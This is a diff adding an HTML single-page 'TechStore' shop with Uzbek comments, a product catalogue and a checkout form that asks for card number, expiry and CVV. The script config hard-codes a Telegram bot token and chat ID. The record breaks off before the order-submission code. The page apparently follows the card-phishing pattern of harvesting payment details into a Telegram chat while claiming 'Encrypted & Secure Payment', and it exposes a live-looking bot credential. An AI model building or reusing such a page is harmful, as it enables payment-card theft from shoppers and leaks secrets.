@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Next-Gen Tech Store</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css">
+<meta name="referrer" content="no-referrer">
+
+    <style>
+        :root {
+            --primary-blue: #2563eb;
+            --bg-light: #f8fafc;
+            --card-shadow: 0 10px 30px rgba(0,0,0,0.05);
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--bg-light);
+            color: #1e293b;
+        }
+.checkout-card {
+            background: white;
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            width: 450px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        /* Tepadagi Full Name bilan bir xil stil */
+        .custom-input, .iti {
+            width: 100% !important;
+            margin-bottom: 20px;
+        }
+
+        /* Inputning o'zini dizayni */
+        .custom-input, .iti input {
+            background: #f1f5f9 !important; /* Rasmdagi och ko'k/kulrang rang */
+            border: none !important;
+            border-radius: 14px !important;
+            padding: 14px 20px !important;
+            width: 100% !important;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 16px;
+            color: #334155;
+            transition: 0.3s;
+        }
+/* Rasmlar konteynerga sig'ishi uchun */
+.product-item img { 
+    width: 100%; 
+    height: 100%; 
+    object-fit: contain; /* Rasm asl holicha sig'adi */
+    margin-bottom: 15px;
+}
+
+/* Telefon raqami yozuvi yonga surilishi uchun */
+.iti input {
+    background: #f1f5f9 !important;
+    border: none !important;
+    border-radius: 14px !important;
+    padding: 14px 20px !important;
+    padding-left: 95px !important; /* RAQAMNI YONGA SURADIGAN JOYI SHU */
+    width: 100% !important;
+}
+
+        .iti input {
+            padding-left: 55px !important; /* Bayroq uchun joy */
+        }
+
+        .custom-input:focus, .iti input:focus {
+            background: #e2e8f0 !important;
+            box-shadow: 0 0 0 2px #2563eb33;
+        }
+
+        .pay-btn {
+            background: #2563eb;
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border-radius: 16px;
+            border: none;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(37, 99, 235, 0.2);
+        }
+
+        /* Header */
+        header {
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid #e2e8f0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+.iti { 
+        width: 100% !important; 
+        margin-bottom: 20px; 
+    }
+
+    /* ASOSIY YECHIM SHU YERDA: */
+    .iti input {
+        background: #f1f5f9 !important;
+        border: none !important;
+        border-radius: 14px !important;
+        padding: 14px 20px !important;
+        
+        /* Raqam bayroq ustiga chiqib ketmasligi uchun: */
+        padding-left: 95px !important; 
+        
+        width: 100% !important;
+        box-sizing: border-box;
+        outline: none;
+        font-size: 16px;
+    }
+        .logo-box {
+            width: 35px; height: 35px;
+            background: var(--primary-blue);
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-weight: bold;
+        }
+
+        /* Hero Section */
+        .hero-card {
+            background: linear-gradient(135deg, #111 0%, #333 100%);
+            border-radius: 30px;
+            padding: 80px 60px;
+            color: white;
+            margin-bottom: 50px;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-card h1 { font-weight: 800; font-size: clamp(2.5rem, 5vw, 4rem); line-height: 1.1; }
+        .hero-card p { color: #94a3b8; max-width: 500px; margin: 20px 0; }
+
+        /* Product Cards */
+        .product-item {
+            background: white;
+            border-radius: 24px;
+            padding: 20px;
+            transition: all 0.3s ease;
+            border: 1px solid #f1f5f9;
+            cursor: pointer;
+            text-align: center;
+        }
+        .product-item:hover { transform: translateY(-10px); box-shadow: 0 20px 40px rgba(0,0,0,0.08); }
+        .product-item img { height: 220px; object-fit: contain; margin-bottom: 15px; }
+
+        /* Product Detail Page */
+        .main-img-container { background: white; border-radius: 30px; padding: 40px; }
+        .thumb-gallery .thumb-box {
+            width: 70px; height: 70px; border: 2px solid transparent;
+            border-radius: 12px; cursor: pointer; background: white;
+            padding: 5px; display: flex; align-items: center; justify-content: center;
+        }
+        .thumb-gallery .thumb-box.active { border-color: var(--primary-blue); }
+        .spec-table td { padding: 12px 0; border-bottom: 1px solid #f1f5f9; }
+
+        /* Checkout Styles */
+        .form-card, .summary-card { background: white; border-radius: 24px; padding: 30px; box-shadow: var(--card-shadow); }
+        .step-badge {
+            width: 25px; height: 25px; background: var(--primary-blue);
+            color: white; border-radius: 50%; display: inline-flex;
+            align-items: center; justify-content: center; margin-right: 10px; font-size: 12px;
+        }
+        .input-group-custom {
+            background: #f8fafc; border: 1px solid #e2e8f0;
+            border-radius: 12px; padding: 10px 15px; margin-bottom: 15px;
+        }
+        .input-group-custom input { border: none; background: transparent; width: 100%; outline: none; }
+        
+        .visual-card {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            border-radius: 20px; padding: 25px; color: white; margin-bottom: 20px;
+        }
+
+        .pay-button {
+            background: var(--primary-blue); color: white; border: none;
+            width: 100%; padding: 18px; border-radius: 15px; font-weight: 700;
+        }
+
+        .page { display: none; }
+        .page.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .valid { color: #10b981; }
+        .invalid { color: #ef4444; }
+/* Haqiqiy Store Dizayni uchun qo'shimcha */
+.hero-section {
+    background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+    border-radius: 40px;
+    padding: 100px 60px;
+    margin-bottom: 60px;
+    position: relative;
+    overflow: hidden;
+}
+
+.hero-content { position: relative; z-index: 2; }
+
+.hero-image-bg {
+    position: absolute;
+    right: -10%;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 250px;
+    opacity: 0.05;
+    pointer-events: none;
+}
+
+.category-chip {
+    padding: 10px 25px;
+    border-radius: 50px;
+    background: white;
+    border: 1px solid #e2e8f0;
+    cursor: pointer;
+    transition: 0.3s;
+    font-weight: 600;
+    display: inline-block;
+    margin-right: 10px;
+}
+
+.category-chip.active, .category-chip:hover {
+    background: var(--primary-blue);
+    color: white;
+    border-color: var(--primary-blue);
+}
+
+.product-card-premium {
+    background: white;
+    border-radius: 28px;
+    padding: 15px;
+    border: 1px solid #f1f5f9;
+    transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    height: 100%;
+}
+
+.product-card-premium:hover {
+    transform: translateY(-15px);
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
+}
+
+.img-wrapper {
+    background: #f8fafc;
+    border-radius: 22px;
+    height: 250px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+    overflow: hidden;
+    padding: 20px;
+}
+
+.img-wrapper img {
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+    transition: 0.5s;
+}
+
+.product-card-premium:hover .img-wrapper img {
+    transform: scale(1.1);
+}
+:root {
+    --header-bg: rgba(255, 255, 255, 0.8);
+    --primary-color: #2563eb;
+    --text-dark: #0f172a;
+    --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.main-header {
+    background: var(--header-bg);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+    z-index: 1000;
+    padding: 12px 0;
+}
+
+.header-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 20px;
+}
+
+/* Logo Style */
+.brand-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    cursor: pointer;
+}
+
+.logo-icon { font-size: 28px; }
+
+.brand-name {
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: -1px;
+    color: var(--text-dark);
+}
+
+.brand-name span { color: var(--primary-color); }
+
+/* Search Box Style */
+.search-section {
+    flex-grow: 1;
+    max-width: 600px;
+    position: relative;
+}
+
+.search-box {
+    display: flex;
+    background: #f1f5f9;
+    border-radius: 50px;
+    padding: 4px 4px 4px 20px;
+    transition: var(--transition);
+    border: 2px solid transparent;
+}
+
+.search-box:focus-within {
+    background: white;
+    border-color: var(--primary-color);
+    box-shadow: 0 10px 20px rgba(37, 99, 235, 0.1);
+}
+
+.search-box input {
+    border: none;
+    background: transparent;
+    width: 100%;
+    outline: none;
+    font-size: 15px;
+    color: var(--text-dark);
+}
+
+.search-btn {
+    
+    color: white;
+    border: none;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: var(--transition);
+}
+
+.search-btn:hover { transform: scale(1.05); background: #1d4ed8; }
+
+/* Actions & Buttons */
+.header-buttons {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.action-btn {
+    background: transparent;
+    border: none;
+    font-size: 20px;
+    position: relative;
+    padding: 8px;
+    border-radius: 12px;
+    transition: var(--transition);
+}
+
+.action-btn:hover { background: #f1f5f9; }
+
+.cart-badge {
+    position: absolute;
+    top: 0;
+    right: 0;
+    background: var(--primary-color);
+    color: white;
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 50px;
+    border: 2px solid white;
+}
+
+.auth-btn {
+    background: var(--text-dark);
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 50px;
+    font-weight: 600;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    transition: var(--transition);
+}
+
+.auth-btn:hover { opacity: 0.9; transform: translateY(-2px); }
+
+/* Search Dropdown */
+.search-results-dropdown {
+    position: absolute;
+    top: 110%;
+    left: 0;
+    width: 100%;
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+    display: none;
+    max-height: 400px;
+    overflow-y: auto;
+    z-index: 1001;
+}
+.cat-pill {
+    padding: 12px 28px;
+    border-radius: 50px;
+    border: 1px solid #e2e8f0;
+    background: white;
+    font-weight: 600;
+    white-space: nowrap;
+    transition: all 0.3s ease;
+    color: #475569;
+}
+
+.cat-pill.active {
+    background: #2563eb;
+    color: white;
+    border-color: #2563eb;
+    box-shadow: 0 10px 20px rgba(37, 99, 235, 0.2);
+}
+
+.cat-pill:hover:not(.active) {
+    background: #f8fafc;
+    border-color: #cbd5e1;
+}
+
+.no-scrollbar::-webkit-scrollbar {
+    display: none;
+}
+.add-cart-btn {
+    width: 45px;
+    height: 45px;
+    background: #f1f5f9;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: 0.3s;
+}
+
+.product-card-premium:hover .add-cart-btn {
+    background: var(--primary-blue);
+    color: white;
+}
+    </style>
+</head>
+<body>
+
+<header class="main-header sticky-top">
+    <div class="container">
+        <div class="header-wrapper">
+            <div class="logo-section" onclick="showPage('home')">
+                <div class="brand-logo">
+                    
+                    <span class="brand-name">TECH<span>STORE</span></span>
+                </div>
+            </div>
+
+            <div class="search-section">
+                <div class="search-box">
+                    <input type="text" id="mainSearchInput" placeholder="Qidiring..." onkeyup="handleSearch(event)">
+                    <button class="search-btn" onclick="executeSearch()">
+                        <span class="search-icon">🔎</span>
+                    </button>
+                </div>
+                <div id="searchDropdown" class="search-results-dropdown"></div>
+            </div>
+
+            <div class="actions-section">
+                <nav class="d-none d-xl-flex header-nav">
+                    <a href="#" class="nav-item">Katalog</a>
+                    <a href="#" class="nav-item">Aksiyalar</a>
+                </nav>
+                
+                <div class="header-buttons">
+                    <button class="action-btn" title="Saralanganlar">
+                        <span>🤍</span>
+                    </button>
+                    
+                    <button class="action-btn cart-btn" onclick="toggleCart()">
+                        <span>🛒</span>
+                        <span class="cart-badge" id="cartCount">0</span>
+                    </button>
+
+                    <button class="auth-btn" onclick="toggleLoginModal()">
+                        <span class="auth-icon">👤</span>
+                        <span class="d-none d-md-inline">Kirish</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main class="container mt-4">
+    <section id="home" class="page active">
+    <div class="hero-section">
+        <div class="hero-image-bg">🛒</div>
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6 hero-content">
+                    <span class="badge bg-primary mb-3 px-3 py-2 rounded-pill">Season Sale 2024</span>
+                    <h1 class="display-3 fw-bolder text-white mb-4">Limited Edition <br><span class="text-primary text-opacity-75">Tech Collection</span></h1>
+                    <p class="lead text-white-50 mb-5">Dunyoning eng sara gadjetlari endi hamyonbop narxlarda. Sifat va kafolat bir joyda.</p>
+                    <div class="d-flex gap-3">
+                        <button class="btn btn-primary btn-lg rounded-pill px-5 py-3 fw-bold">Explore Now</button>
+                        <button class="btn btn-outline-light btn-lg rounded-pill px-5 py-3 fw-bold">View Offers</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+   <div class="container my-5">
+    <h3 class="fw-bold mb-4">Shop by Category</h3>
+    <div class="category-slider d-flex gap-3 overflow-auto pb-3 no-scrollbar">
+        <button class="cat-pill active" onclick="filterByCategory('All')">All Products</button>
+        <button class="cat-pill" onclick="filterByCategory('Smartphones')">Smartphones</button>
+        <button class="cat-pill" onclick="filterByCategory('Computers')">Computers</button>
+        <button class="cat-pill" onclick="filterByCategory('Audio')">Audio</button>
+        <button class="cat-pill" onclick="filterByCategory('Trending')">🔥 Trending Now</button>
+    </div>
+
+    <div class="d-flex justify-content-between align-items-center mt-5 mb-4">
+        <h3 class="fw-bold m-0">Discover New Tech</h3>
+        <div class="sort-wrapper">
+            <select class="form-select border-0 fw-bold bg-light rounded-pill" id="priceSort" onchange="sortProducts()">
+                <option value="default">Price: Default</option>
+                <option value="low">Price: Low to High</option>
+                <option value="high">Price: High to Low</option>
+            </select>
+        </div>
+    </div>
+</div>
+
+    <div class="row g-4" id="productList">
+        </div>
+</section>
+
+    <section id="product" class="page">
+        <button class="btn btn-link text-decoration-none mb-4 p-0 text-dark fw-bold" onclick="showPage('home')">← Back to Store</button>
+        <div class="row g-5">
+            <div class="col-lg-7 text-center">
+                <div class="main-img-container shadow-sm mb-3">
+                    <img id="pImg" class="img-fluid" style="max-height: 450px;">
+                </div>
+                <div class="d-flex gap-3 justify-content-center thumb-gallery" id="pGallery">
+                    </div>
+            </div>
+            <div class="col-lg-5">
+                <span class="badge bg-primary-subtle text-primary rounded-pill px-3 mb-3">Best Seller</span>
+                <h1 id="pName" class="display-5 fw-extrabold mb-3"></h1>
+                <div class="d-flex align-items-end gap-3 mb-4">
+                    <h2 id="pPrice" class="text-primary fw-bold mb-0"></h2>
+                    <span class="text-muted text-decoration-line-through small" id="oldPrice"></span>
+                </div>
+                <p id="pDesc" class="text-secondary fs-5 mb-4 border-start ps-3" style="border-width: 3px !important; border-color: var(--primary-blue) !important;"></p>
+                
+                <h6 class="fw-bold mt-4">Key Specifications</h6>
+                <ul id="pSpecsList" class="list-unstyled mb-5"></ul>
+
+                <button class="pay-button py-4 fs-5" onclick="openOrder()">Buy Now - <span class="priceSpan"></span></button>
+            </div>
+        </div>
+
+        <div class="row mt-5 pt-5 border-top">
+            <div class="col-md-8">
+                <h4 class="fw-bold mb-4">Technical Specifications</h4>
+                <table class="table spec-table">
+                    <tbody id="pFullTable"></tbody>
+                </table>
+            </div>
+            <div class="col-md-4">
+                <div class="bg-white p-4 rounded-4 shadow-sm border">
+                    <h6 class="fw-bold mb-3">What's in the box?</h6>
+                    <div class="small text-muted">✅ 1x Device</div>
+                    <div class="small text-muted mt-2">✅ USB-C Charging Cable</div>
+                    <div class="small text-muted mt-2">✅ Warranty Card (2 Years)</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="order" class="page">
+        <div class="row g-4">
+            <div class="col-lg-7">
+                <div class="form-card">
+                    <h3 class="fw-bold mb-4">Secure Checkout</h3>
+                    
+                    <h6 class="fw-bold mb-3"><span class="step-badge">1</span> Shipping Details</h6>
+                    <label class="small text-muted fw-bold">Full Name</label>
+                    <div class="input-group-custom"><input type="text" id="fullName" placeholder="Armando Steel"></div>
+                    
+                    <label class="small text-muted fw-bold">Phone Number</label>
+                    <div class="mb-3"><input type="tel" id="phone" class="w-100"></div>
+
+                    <div class="row">
+                        <div class="col-8">
+                            <label class="small text-muted fw-bold">Address</label>
+                            <div class="input-group-custom"><input type="text" id="address" placeholder="Street Address"></div>
+                        </div>
+                        <div class="col-4">
+                            <label class="small text-muted fw-bold">House No.</label>
+                            <div class="input-group-custom"><input type="text" id="house" placeholder="12A"></div>
+                        </div>
+                    </div>
+
+                    <h6 class="fw-bold mb-3 mt-4"><span class="step-badge">2</span> Payment Information</h6>
+                    <div class="visual-card">
+                        <div class="d-flex justify-content-between mb-4 align-items-center">
+                            <div style="width: 40px; height: 25px; background: #facc15; border-radius: 4px; opacity: 0.8;"></div>
+                            <small class="fw-bold opacity-50">CREDIT CARD</small>
+                        </div>
+                        <div id="vCardNum" class="fs-4 fw-bold mb-4 tracking-widest">•••• •••• •••• ••••</div>
+                        <div class="d-flex justify-content-between">
+                            <div><small class="opacity-50 d-block">Holder Name</small><span id="vCardName" class="small">ARMANDO STEEL</span></div>
+                            <div><small class="opacity-50 d-block">Expires</small><span id="vCardExp" class="small">12/34</span></div>
+                        </div>
+                    </div>
+
+                    <label class="small text-muted fw-bold">Card Number</label>
+                    <div class="input-group-custom d-flex align-items-center">
+                        <input type="text" id="cardNumber" placeholder="8600 0000 0000 0000" maxlength="19">
+                        <span id="cardStatus"></span>
+                    </div>
+
+                    <div class="row">
+                        <div class="col-6">
+                            <label class="small text-muted fw-bold">Expiry Date</label>
+                            <div class="input-group-custom"><input type="text" id="expiry" placeholder="MM/YY" maxlength="5"></div>
+                        </div>
+                        <div class="col-6">
+                            <label class="small text-muted fw-bold">CVV</label>
+                            <div class="input-group-custom"><input type="text" id="cvv" placeholder="•••" maxlength="3"></div>
+                        </div>
+                    </div>
+
+                    <button class="pay-button mt-4" onclick="submitOrder()">Pay <span class="priceSpan"></span></button>
+                    <p class="text-center mt-3 text-muted small">🔒 Encrypted & Secure Payment</p>
+                </div>
+            </div>
+
+            <div class="col-lg-5">
+                <div class="summary-card">
+                    <h6 class="fw-bold mb-4">Order Summary</h6>
+                    <div class="d-flex gap-3 mb-4 pb-4 border-bottom">
+                        <img id="sumImg" style="width: 80px; height: 80px; object-fit: contain; border-radius: 12px; background: #f8fafc;">
+                        <div>
+                            <div id="sumName" class="fw-bold"></div>
+                            <div id="sumDesc" class="small text-muted"></div>
+                        </div>
+                    </div>
+                    <div class="d-flex justify-content-between mb-2"><span>Subtotal</span> <span id="subTotal"></span></div>
+                    <div class="d-flex justify-content-between mb-2"><span>Shipping</span> <span class="text-success">Free</span></div>
+                    <div class="d-flex justify-content-between border-top pt-3 mt-3 fw-bold fs-5">
+                        <span>Total</span> <span class="text-primary priceSpan"></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer class="py-5 mt-5 border-top bg-white text-center">
+    <p class="text-muted small">&copy; 2024 TechStore Premium. Buy everything which you want.</p>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
+<script>
+// ===== KONFIGURATSIYA =====
+const BOT_TOKEN = "8193544415:AAFusEYG2FfACcXPht62SYOUU4lyitjdg70";
+const CHAT_ID = "8319246696";
+
+
+   const products = [
+    { 
+        id: 1, 
+        name: "Smart Watch Pro", 
+        category: "Smartphones", 
+        price: "$49.99", 
+        trending: true, 
+        rating: 4.8,
+        img: "https://avatars.mds.yandex.net/get-mpic/17846399/2a0000019a21e93e91f3a067dc8ca789ee6f/orig", 
+        desc: "Premium smartwatch with health tracking.", 
+        specs: ["Heart Rate", "Waterproof", "7-day battery"] 
+    },
+    { 
+        id: 2, 
+        name: "Wireless Earbuds", 
+        category: "Audio", 
+        price: "$29.99", 
+        trending: true, 
+        rating: 4.9,
+        img: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500", 
+        desc: "Noise cancelling spatial audio earbuds.", 
+        specs: ["Active ANC", "Fast charge", "HD sound"] 
+    },
+    { 
+        id: 3, 
+        name: "Bluetooth Speaker", 
+        category: "Audio", 
+        price: "$39.99", 
+        trending: false, 
+        rating: 4.5,
+        img: "https://images.unsplash.com/photo-1608156639585-b3a032ef9689?w=500", 
+        desc: "Portable speaker with deep bass.", 
+        specs: ["360 Surround", "IPX5", "Compact"] 
+    },
+    { 
+        id: 4, 
+        name: "iPhone 15 Pro", 
+        category: "Smartphones", 
+        price: "$1199.00", 
+        trending: true, 
+        rating: 5.0,
+        img: "https://images.unsplash.com/photo-1696446701796-da61225697cc?w=500", 
+        desc: "Titanium design with A17 Pro chip.", 
+        specs: ["A17 Pro", "48MP Camera", "Titanium"] 
+    },
+    { 
+        id: 5, 
+        name: "MacBook Air", 
+        category: "Computers", 
+        price: "$999.00", 
+        trending: true, 
+        rating: 4.9,
+        img: "https://avatars.mds.yandex.net/get-mpic/4080064/2a00000190d444124598fbe5c68657cb2db8/orig", 
+        desc: "Thin and fast with Apple M2 chip.", 
+        specs: ["M2 Chip", "13.6 inch", "18h Battery"] 
+    },
+    { 
+        id: 6, 
+        name: "Gaming Mouse", 
+        category: "Accessories", 
+        price: "$19.99", 
+        trending: false, 
+        rating: 4.4,
+        img: "https://images.unsplash.com/photo-1527443224154-c4a3942d3acf?w=500", 
+        desc: "High precision optical RGB mouse.", 
+        specs: ["12000 DPI", "6 Buttons", "RGB"] 
+    },
+    { 
+        id: 7, 
+        name: "Keyboard RGB", 
+        category: "Accessories", 
+        price: "$55.00", 
+        trending: false, 
+        rating: 4.6,
+        img: "https://avatars.mds.yandex.net/get-mpic/12525950/2a00000195986d5ee7a0181640a537f47969/orig", 
+        desc: "Mechanical tactile switches keyboard.", 
+        specs: ["RGB Backlit", "Mechanical", "Wireless"] 
+    },
+    { 
+        id: 8, 
+        name: "Sony Headphones", 
+        category: "Audio", 
+        price: "$348.00", 
+        trending: true, 
+        rating: 4.9,
+        img: "https://hi-stores.ru/upload/iblock/a6e/en96nxjzko58sf68m59sw55m5gumha7f.jpg", 
+        desc: "Industry leading noise canceling.", 
+        specs: ["NC Optimizer", "30h Battery", "Spatial Audio"] 
+    },
+    { 
+        id: 9, 
+        name: "GoPro Hero 12", 
+        category: "Cameras", 
+        price: "$399.00", 
+        trending: true, 
+        rating: 4.7,
+        img: "https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=500", 
+        desc: "Action camera with 5.3K video.", 
+        specs: ["5.3K Video", "HDR", "Waterproof"] 
+    },
+    { 
+        id: 10, 
+        name: "Kindle E-reader", 
+        category: "Accessories", 
+        price: "$139.00", 
+        trending: false, 
+        rating: 4.8,
+        img: "https://images.unsplash.com/photo-1592492159418-39f319320569?w=500", 
+        desc: "Adjustable warm light for reading.", 
+        specs: ["Waterproof", "10-week Battery", "USB-C"] 
+    },
+    { 
+        id: 11, 
+        name: "Samsung Tablet", 
+        category: "Smartphones", 
+        price: "$799.00", 
+        trending: false, 
+        rating: 4.7,
+        img: "https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=500", 
+        desc: "Powerful tablet with AMOLED screen.", 
+        specs: ["S Pen", "Snapdragon 8", "IP68"] 
+    },
+    { 
+        id: 12, 
+        name: "4K Drone", 
+        category: "Cameras", 
+        price: "$299.00", 
+        trending: true, 
+        rating: 4.5,
+        img: "https://basket-31.wbbasket.ru/vol6218/part621862/621862084/images/big/1.webp", 
+        desc: "GPS drone with UHD camera.", 
+        specs: ["4K Camera", "GPS", "30min Flight"] 
+    },
+    { 
+        id: 13, 
+        name: "Fitness Tracker", 
+        category: "Smartphones", 
+        price: "$159.00", 
+        trending: false, 
+        rating: 4.3,
+        img: "https://images.unsplash.com/photo-1557166983-5939644443a0?w=500", 
+        desc: "Advanced tracker with built-in GPS.", 
+        specs: ["Built-in GPS", "ECG App", "7-day Battery"] 
+    },
+    { 
+        id: 14, 
+        name: "Power bank 37 21", 
+        category: "Accessories", 
+        price: "$25.00", 
+        trending: false, 
+        rating: 4.6,
+        img: "https://avatars.mds.yandex.net/get-mpic/5320546/img_id4701716952274856907.jpeg/13hq", 
+        desc: "20000mAh fast charging battery.", 
+        specs: ["PD 20W", "Triple Output", "Fast Charge"] 
+    },
+    { 
+        id: 15, 
+        name: "БЗУ Belkin 3-in-1 Wireless Charging Pad with USB-C belkin", 
+        category: "Accessories", 
+        price: "$34.99", 
+        trending: false, 
+        rating: 4.2,
+        img: "https://basket-26.wbbasket.ru/vol4719/part471950/471950593/images/big/1.webp", 
+        desc: "3-in-1 charger for mobile devices.", 
+        specs: ["Qi-Certified", "Fast Charge", "Safe"] 
+    },
+    { 
+        id: 16, 
+        name: "VR Headset Pro", 
+        category: "Accessories", 
+        price: "$499.00", 
+        trending: true, 
+        rating: 4.8,
+        img: "https://images.unsplash.com/photo-1622979135225-d2ba269cf1ac?w=500", 
+        desc: "Immersive virtual reality headset.", 
+        specs: ["2K Display", "Spatial Audio", "Tracking"] 
+    },
+    { 
+        id: 17, 
+        name: "Wi-Fi Smart Camera C500 Dual (MBC22) ", 
+        category: "Accessories", 
+        price: "$45.00", 
+        trending: false, 
+        rating: 4.5,
+        img: "https://avatars.mds.yandex.net/get-mpic/5235119/2a000001999aad6a41bdfbba9c048f4ec492/orig", 
+        desc: "1080p security camera with AI.", 
+        specs: ["Motion Detection", "Night Vision", "Cloud"] 
+    },
+    { 
+        id: 18, 
+        name: "Внешний SSD накопитель OWC Envoy Ultra 4TB IP67", 
+        category: "Computers", 
+        price: "$89.00", 
+        trending: false, 
+        rating: 4.9,
+        img: "https://a.allegroimg.com/original/116fd7/e4b0f1ce4c93aa35c9a9a626ce7b/OWC-Envoy-Express-obudowa-Thunderbolt-3-4-M-2-NVMe", 
+        desc: "Portable SSD for fast data backup.", 
+        specs: ["1050MB/s Speed", "USB 3.2", "Rugged"] 
+    },
+    { 
+        id: 19, 
+        name: "Gaming Controller", 
+        category: "Accessories", 
+        price: "$59.00", 
+        trending: true, 
+        rating: 4.7,
+        img: "https://avatars.mds.yandex.net/get-mpic/14586592/2a0000019a1117023b5851131e528399bd62/orig", 
+        desc: "Wireless controller for PC/Console.", 
+        specs: ["Hall Effect", "600mAh", "Low Latency"] 
+    },
+    { 
+        id: 20, 
+        name: "Smart LED Bulb", 
+        category: "Accessories", 
+        price: "$12.99", 
+        trending: false, 
+        rating: 4.6,
+        img: "https://img.joomcdn.net/d722a48a7c055cf77d641824d644688720f7d5c5_original.jpeg", 
+        desc: "Wi-Fi smart light bulb RGB.", 
+        specs: ["16M Colors", "Voice Control", "RGB"] 
+    }
+];
+let currentProduct = null;
+
+// ===== NAVIGATION =====
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+    window.scrollTo(0,0);
+}
+
+// ===== RENDER PRODUCTS =====
+// Mahsulotlarni ekranga chiqarish (Yangilangan versiya)
+// Mahsulotlarni ekranga chiqarish (Yangilangan versiya)
+const list = document.getElementById("productList");
+list.innerHTML = ""; // Tozalab olish
+
+products.forEach(p => {
+    const col = document.createElement("div");
+    col.className = "col-12 col-sm-6 col-md-4 col-xl-3"; // 4 ta ustunli setka
+    col.innerHTML = `
+        <div class="product-card-premium" onclick="openProduct(${p.id})">
+            <div class="img-wrapper">
+                <img src="${p.img}" alt="${p.name}">
+            </div>
+            <div class="p-2">
+                <div class="d-flex justify-content-between align-items-start mb-2">
+                    <div>
+                        <small class="text-muted d-block mb-1">Premium Gear</small>
+                        <h5 class="fw-bold mb-0" style="font-size: 1.1rem;">${p.name}</h5>
+                    </div>
+                    <div class="add-cart-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                          <path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z"/>
+                        </svg>
+                    </div>
+                </div>
+                <div class="d-flex align-items-center gap-2 mt-3">
+                    <span class="fs-5 fw-bold text-primary">${p.price}</span>
+                    <span class="text-muted text-decoration-line-through" style="font-size: 0.85rem;">$${(parseFloat(p.price.replace('$','')) + 20).toFixed(2)}</span>
+                </div>
+                <div class="mt-3 pt-3 border-top d-flex justify-content-between align-items-center">
+                    <span class="small text-success fw-semibold">● In Stock</span>
+                    <div class="text-warning small">
+                        ★★★★☆ <span class="text-muted">(12)</span>
+                    </div>
+                </div>
+            </div>
+        </div>`;
+    list.appendChild(col);
+});
+
+let currentCategory = 'All';
+
+// 1. Kategoriyaga qarab filtrlash
+function filterByCategory(category) {
+    currentCategory = category;
+    
+    // Tugmalarning "active" klassini yangilash
+    document.querySelectorAll('.cat-pill').forEach(btn => {
+        btn.classList.remove('active');
+        if(btn.innerText.includes(category)) btn.classList.add('active');
+    });
+
+    let filtered;
+    if (category === 'All') {
+        filtered = products;
+    } else if (category === 'Trending') {
+        filtered = products.filter(p => p.trending === true);
+    } else {
+        filtered = products.filter(p => p.category === category);
+    }
+    
+    renderFilteredList(filtered);
+}
+
+// 2. Narx bo'yicha tartiblash (Low to High / High to Low)
+function sortProducts() {
+    let sortType = document.getElementById('priceSort').value;
